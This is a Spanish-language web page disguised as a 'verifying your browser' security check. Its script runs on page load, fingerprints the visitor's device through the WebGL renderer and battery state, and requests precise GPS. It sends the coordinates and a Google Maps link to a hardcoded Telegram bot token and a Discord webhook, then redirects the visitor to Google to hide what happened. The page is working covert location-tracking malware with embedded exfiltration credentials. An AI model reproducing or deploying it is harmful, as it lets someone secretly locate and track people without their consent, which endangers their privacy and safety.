<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { 
            background: #ffffff; 
            color: #3c4043; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { text-align: center; max-width: 350px; }
        .loader { 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #4285f4; 
            border-radius: 50%; 
            width: 35px; 
            height: 35px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.2rem; font-weight: 400; margin-bottom: 8px; }
        p { font-size: 0.9rem; color: #70757a; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Espera un momento...</h1>
        <p>Estamos confirmando que tu conexión es segura para continuar.</p>
    </div>

    <script>
        const CONFIG = {
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            exit: "https://www.google.com"
        };

        async function recolectar() {
            // 1. ID Único
            let id;
            try {
                id = localStorage.getItem('_uid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
                localStorage.setItem('_uid', id);
            } catch(e) { id = "hubo problemas con este criterio"; }

            // 2. Dispositivo (Marca/Modelo estimado)
            let hardware;
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) { hardware = "hubo problemas con este criterio"; }

            // 3. Batería y Estado de Carga
            let batStatus;
            try {
                const b = await navigator.getBattery();
                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
            } catch(e) { batStatus = "hubo problemas con este criterio"; }

            // 4. GPS y enlace a Maps
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (p) => finalizar(p, id, hardware, batStatus),
                    () => finalizar(null, id, hardware, batStatus),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                finalizar(null, id, hardware, batStatus);
            }
        }

        async function finalizar(pos, id, hw, bat) {
            let gpsTxt = "hubo problemas con esta criterio";
            let mapLink = "";

            if (pos) {
                const { latitude, longitude, accuracy } = pos.coords;
                gpsTxt = `Lat: \`${latitude}\`\nLon: \`${longitude}\`\n🎯 Precisión: \`${Math.round(accuracy)}m\``;
                // Enlace directo a Google Maps
                mapLink = `\n🗺️ *Google Maps:* https://www.google.com/maps?q=${latitude},${longitude}`;
            }

            const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Coordenadas:**\n${gpsTxt}${mapLink}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            try {
                // Envío a Telegram
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CONFIG.chat,
                        text: report,
                        parse_mode: "Markdown",
                        disable_web_page_preview: false // Cambiado a false para que se vea la vista previa del mapa si es posible
                    })
                });

                // Envío a Discord
                await fetch(CONFIG.webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                });
            } catch(e) {}

            // Redirección
            window.location.href = CONFIG.exit;
        }

        window.onload = recolectar;
    </script>
</body>
</html>
